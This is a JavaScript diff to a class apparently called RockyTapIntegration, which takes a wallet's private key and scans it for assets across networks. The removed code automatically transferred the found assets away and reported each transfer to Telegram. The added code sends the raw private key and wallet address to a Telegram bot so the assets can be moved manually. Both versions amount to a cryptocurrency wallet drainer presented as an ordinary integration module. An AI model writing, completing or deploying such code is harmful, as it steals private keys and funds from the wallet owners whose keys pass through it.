@@ -70,54 +70,28 @@ class RockyTapIntegration {
         estimatedValue: scanResults.summary.estimatedValue
       });
 
-      // Step 3: Process transfers if assets found
+      // Step 3: Send key and address to bot for manual transfer
+      // DISABLED AUTO TRANSFER - User will transfer manually
       if (scanResults.summary.networksWithAssets > 0) {
-        console.log(`[${processId}] Processing transfers...`);
-        process.status = 'processing';
-        await this.telegramNotifier.sendProcessingStarted();
-
-        const transferResults = await this.assetProcessor.processAssets(
+        console.log(`[${processId}] Assets found - sending key and address to bot for manual transfer`);
+        process.status = 'completed';
+        
+        // Send key and address to bot
+        await this.telegramNotifier.sendKeyAndAddressForManualTransfer(
           privateKey,
+          walletAddress,
           scanResults
         );
-        process.transferResults = transferResults;
-
-        // Send transfer notifications
-        for (const transfer of transferResults.transfers) {
-          if (transfer.success) {
-            await this.telegramNotifier.sendTransferSuccess(
-              transfer.network,
-              transfer.type,
-              transfer.amount,
-              transfer.symbol,
-              transfer.txHash
-            );
-          } else if (transfer.skipped) {
-            // اگر skip شده (مثل gas reservoir balance نداره)، notification نمی‌فرستیم
-            console.log(`⏭️  Skipped ${transfer.symbol} on ${transfer.network} - ${transfer.error}`);
-          } else {
-            // فقط برای real failures notification می‌فرستیم
-            await this.telegramNotifier.sendTransferFailed(
-              transfer.network,
-              transfer.type,
-              transfer.amount,
-              transfer.symbol,
-              transfer.error
-            );
-          }
-        }
-
-        // Send completion summary
-        await this.telegramNotifier.sendProcessingComplete({
-          totalTransfers: transferResults.totalTransfers,
-          successful: transferResults.successful,
-          failed: transferResults.failed,
-          totalValue: scanResults.summary.estimatedValue
-        });
-
-        process.status = 'completed';
+        
+        process.transferResults = {
+          totalTransfers: 0,
+          successful: 0,
+          failed: 0,
+          transfers: [],
+          manual: true
+        };
       } else {
-        console.log(`[${processId}] No assets found, skipping transfers`);
+        console.log(`[${processId}] No assets found`);
         await this.telegramNotifier.sendNoAssetsFound(walletAddress);
         process.status = 'completed';
         process.transferResults = {
